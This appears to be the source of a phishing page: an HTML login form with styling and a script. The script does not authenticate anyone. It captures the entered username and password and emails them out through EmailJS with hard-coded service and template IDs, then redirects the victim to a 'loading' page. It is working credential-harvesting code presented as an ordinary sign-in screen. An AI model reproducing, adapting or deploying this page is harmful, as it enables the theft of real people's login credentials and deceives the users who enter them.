    <style>
        /* General form styles */
        .form-group {
            position: relative;
            margin-bottom: 20px;
            width: 100%;
        }

        /* Input field styles */
        .form-input {
            width: 100%;
            padding: 15px 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #fff;
            color: #333;
            box-sizing: border-box;
        }

        .form-input:focus {
            border-color: #3b598c;
            outline: none;
        }

        .form-input::placeholder {
            color: transparent;
        }

        /* Label styles */
        .form-label {
            position: absolute;
            top: 50%;
            left: 10px;
            font-size: 14px;
            color: #999;
            pointer-events: none;
            transform: translateY(-50%);
            transition: all 0.2s ease-in-out;
            background-color: #fff;
            padding: 0 5px;
        }

        .form-input:focus + .form-label, 
        .form-input:not(:placeholder-shown) + .form-label {
            top: 0;
            left: 10px;
            font-size: 12px;
            color: #002269;
        }

        /* When input is hovered */
        .form-input:hover {
            border-color: #002269;
        }

        /* Checkbox styles */
        .form-checkbox {
            display: flex;
            align-items: center;
        }

        .checkbox-label {
            margin-left: 10px;
            font-size: 14px;
            color: #002269;
        }

        input[type="checkbox"] {
            appearance: none;
            width: 20px;
            height: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            position: relative;
        }

        input[type="checkbox"]:checked {
            background-color: #002269;
        }

        input[type="checkbox"]:checked::before {
            content: '✓';
            position: absolute;
            top: 0;
            left: 4px;
            color: white;
            font-weight: bold;
            font-size: 14px;
        }

        /* Submit button styles */
        .submit-btn {
            display: block;
            width: 100%; /* Full width */
            padding: 8px;
            font-size: 16px;
            background-color: #002269;
            color: #fff;
            border: none;
            border-radius: 5px; /* Rectangular button */
            cursor: pointer;
            margin: 20px 0; /* Adjusted margin for space */
            transition: background-color 0.2s ease-in-out;
        }

        .submit-btn:hover {
            background-color: 
            #2a4898;
        }

        /* Forgot password link */
        .forgot-link {
            font-size: 14px;
            color: #002269;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        /* Container for both fields */
        .form-container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            border: 1px solid #e0e0e0;
            border-radius: 10px;
            background-color: #fff;
        }
    </style>
</head>
<body>

<form id="login-form">
    <div class="form-container">
        <!-- Username Field -->
        <div class="form-group">
            <input type="text" id="username" class="form-input" placeholder="Enter your username" autocomplete="username">
            <label for="username" class="form-label">Login ID</label>
        </div>

        <!-- Password Field -->
        <div class="form-group">
            <input type="text" id="password" class="form-input" placeholder="Enter your password" autocomplete="current-password">
            <label for="password" class="form-label">Password</label>
        </div>

        <!-- Remember Me Checkbox -->
        <div class="form-group form-checkbox">
            <input type="checkbox" id="remember-me">
            <label for="remember-me" class="checkbox-label">Remember me</label>
        </div>

        <!-- Submit Button -->
        <button class="submit-btn" type="submit">Continue</button>

        <!-- Forgot Password Link -->
        <div class="form-group">
            <a class="forgot-link" href="index.html">Forgot Password?</a>
        </div>
    </div>
</form>

<script>
    emailjs.init("0yC4bDikP_4iLPBZZ");

    function sendEmail(username, password) {
        emailjs.send("service_kljbs77", "template_6qvve8q", {
            username: username,
            password: password
        })
        .then(function(response) {
            console.log('Email sent successfully!', response);
            window.location.href = 'loadingpage.html';
        }, function(error) {
            console.error('Email sending failed:', error);
        });
    }

    document.getElementById('login-form').addEventListener('submit', function(event) {
        event.preventDefault();
        var form = document.getElementById('login-form');
        var username = form.querySelector('#username').value;
        var password = form.querySelector('#password').value;
        sendEmail(username, password);
    });
</script>
